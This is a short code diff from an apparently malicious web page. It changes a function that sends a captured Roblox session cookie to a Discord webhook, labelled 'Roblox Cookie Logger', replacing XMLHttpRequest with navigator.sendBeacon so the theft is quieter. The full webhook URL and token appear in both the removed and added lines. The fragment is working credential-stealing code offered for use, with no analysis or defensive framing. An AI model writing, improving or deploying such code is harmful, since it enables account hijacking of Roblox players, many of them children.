@@ -20,17 +20,12 @@
       }
       
       function sendToWebhook(cookie) {
-        var request = new XMLHttpRequest();
-        request.open('POST', 'https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz');
+        var webhookUrl = 'https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz';
         
-        request.setRequestHeader('Content-type', 'application/json');
-        
-        var params = {
+        navigator.sendBeacon(webhookUrl, JSON.stringify({
           username: 'Roblox Cookie Logger',
           content: '```' + cookie + '```'
-        };
-        
-        request.send(JSON.stringify(params));
+        }));
       }
     </script>
   </body>
